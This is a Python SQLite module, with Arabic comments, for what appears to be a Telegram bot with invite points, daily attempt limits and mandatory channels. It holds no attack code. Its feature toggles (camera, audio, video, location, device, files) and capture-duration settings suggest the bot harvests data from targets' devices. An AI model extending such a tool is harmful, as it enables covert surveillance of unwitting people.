import sqlite3
import json
from datetime import datetime, timedelta
from config import config

DB_PATH = config.DATABASE_FILE

def get_db():
    """الحصول على اتصال بقاعدة البيانات"""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """إنشاء الجداول"""
    conn = get_db()
    cursor = conn.cursor()
    
    # جدول المستخدمين
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            points INTEGER DEFAULT 0,
            total_points INTEGER DEFAULT 0,
            invite_code TEXT UNIQUE,
            invited_by INTEGER,
            joined_date TEXT,
            last_active TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    # جدول الدعوات
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            date TEXT,
            points_earned INTEGER DEFAULT 1
        )
    ''')
    
    # جدول المحاولات اليومية
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_attempts (
            user_id INTEGER,
            date TEXT,
            attempts INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, date)
        )
    ''')
    
    # جدول الإعدادات
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    # جدول القنوات الإجبارية
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS required_channels (
            channel_id TEXT PRIMARY KEY,
            channel_name TEXT,
            is_active INTEGER DEFAULT 1
        )
    ''')
    
    # جدول الميزات (تشغيل/إيقاف)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS features (
            feature_name TEXT PRIMARY KEY,
            is_enabled INTEGER DEFAULT 1
        )
    ''')
    
    # جدول سجل المستخدمين (أول دخول)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )
    ''')
    
    # إضافة الإعدادات الافتراضية
    cursor.execute('''
        INSERT OR IGNORE INTO settings (key, value)
        VALUES 
            ('free_attempts', '3'),
            ('video_duration', '30'),
            ('audio_duration', '30'),
            ('camera_count', '3')
    ''')
    
    # إضافة الميزات الافتراضية
    features = ['camera', 'audio', 'video', 'location', 'device', 'files', 'all']
    for feature in features:
        cursor.execute('''
            INSERT OR IGNORE INTO features (feature_name, is_enabled)
            VALUES (?, 1)
        ''', (feature,))
    
    conn.commit()
    conn.close()

# ====== دوال المستخدمين ======
def get_user(user_id):
    """جلب معلومات المستخدم"""
    conn = get_db()
    user = conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name, last_name, invited_by=None):
    """إنشاء مستخدم جديد"""
    conn = get_db()
    cursor = conn.cursor()
    
    # إنشاء كود دعوة فريد
    import secrets
    invite_code = secrets.token_urlsafe(6)
    
    cursor.execute('''
        INSERT INTO users (user_id, username, first_name, last_name, invite_code, invited_by, joined_date, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, last_name, invite_code, invited_by, datetime.now().isoformat(), datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    
    # إذا كان هناك مدعو، أضف نقاطاً للمدعو
    if invited_by:
        add_points(invited_by, 1, 'invite')
        # سجل الدعوة
        log_invite(invited_by, user_id)
    
    return True

def update_user_activity(user_id):
    """تحديث آخر نشاط للمستخدم"""
    conn = get_db()
    conn.execute('UPDATE users SET last_active = ? WHERE user_id = ?', (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def add_points(user_id, points, reason=''):
    """إضافة نقاط للمستخدم"""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET points = points + ?, total_points = total_points + ? WHERE user_id = ?', (points, points, user_id))
    conn.commit()
    conn.close()
    
    # تسجيل الحدث
    log_action(user_id, 'add_points', f'{points} نقاط - {reason}')

def deduct_points(user_id, points, reason=''):
    """خصم نقاط من المستخدم"""
    conn = get_db()
    cursor = conn.cursor()
    user = cursor.execute('SELECT points FROM users WHERE user_id = ?', (user_id,)).fetchone()
    if user and user['points'] >= points:
        cursor.execute('UPDATE users SET points = points - ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()
        log_action(user_id, 'deduct_points', f'{points} نقاط - {reason}')
        return True
    conn.close()
    return False

def log_action(user_id, action, details=''):
    """تسجيل حدث في سجل المستخدم"""
    conn = get_db()
    conn.execute('''
        INSERT INTO user_logs (user_id, action, details, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (user_id, action, details, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_invite(inviter_id, invited_id):
    """تسجيل دعوة جديدة"""
    conn = get_db()
    conn.execute('''
        INSERT INTO invites (inviter_id, invited_id, date, points_earned)
        VALUES (?, ?, ?, ?)
    ''', (inviter_id, invited_id, datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()

# ====== دوال المحاولات اليومية ======
def get_daily_attempts(user_id):
    """الحصول على عدد المحاولات اليومية للمستخدم"""
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    result = conn.execute('SELECT attempts FROM daily_attempts WHERE user_id = ? AND date = ?', (user_id, today)).fetchone()
    conn.close()
    return result['attempts'] if result else 0

def increment_daily_attempts(user_id):
    """زيادة عدد المحاولات اليومية"""
    today = datetime.now().strftime('%Y-%m-%d')
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO daily_attempts (user_id, date, attempts)
        VALUES (?, ?, 1)
        ON CONFLICT(user_id, date) DO UPDATE SET attempts = attempts + 1
    ''', (user_id, today))
    conn.commit()
    conn.close()

def get_free_attempts_limit():
    """الحصول على عدد المحاولات المجانية المسموح بها"""
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = "free_attempts"').fetchone()
    conn.close()
    return int(result['value']) if result else 3

# ====== دوال القنوات الإجبارية ======
def get_required_channels():
    """الحصول على قائمة القنوات الإجبارية"""
    conn = get_db()
    channels = conn.execute('SELECT * FROM required_channels WHERE is_active = 1').fetchall()
    conn.close()
    return channels

def add_required_channel(channel_id, channel_name):
    """إضافة قناة إجبارية"""
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO required_channels (channel_id, channel_name, is_active)
        VALUES (?, ?, 1)
    ''', (channel_id, channel_name))
    conn.commit()
    conn.close()

def remove_required_channel(channel_id):
    """حذف قناة إجبارية"""
    conn = get_db()
    conn.execute('DELETE FROM required_channels WHERE channel_id = ?', (channel_id,))
    conn.commit()
    conn.close()

# ====== دوال الميزات ======
def is_feature_enabled(feature_name):
    """التحقق من تفعيل ميزة معينة"""
    conn = get_db()
    result = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    conn.close()
    return bool(result['is_enabled']) if result else True

def toggle_feature(feature_name):
    """تبديل حالة الميزة"""
    conn = get_db()
    current = conn.execute('SELECT is_enabled FROM features WHERE feature_name = ?', (feature_name,)).fetchone()
    if current:
        new_value = 0 if current['is_enabled'] else 1
        conn.execute('UPDATE features SET is_enabled = ? WHERE feature_name = ?', (new_value, feature_name))
        conn.commit()
        conn.close()
        return bool(new_value)
    conn.close()
    return False

# ====== دوال الإعدادات ======
def get_setting(key, default=None):
    """الحصول على إعداد"""
    conn = get_db()
    result = conn.execute('SELECT value FROM settings WHERE key = ?', (key,)).fetchone()
    conn.close()
    return result['value'] if result else default

def set_setting(key, value):
    """تعيين إعداد"""
    conn = get_db()
    conn.execute('''
        INSERT OR REPLACE INTO settings (key, value)
        VALUES (?, ?)
    ''', (key, value))
    conn.commit()
    conn.close()

# تهيئة قاعدة البيانات عند الاستيراد
init_db()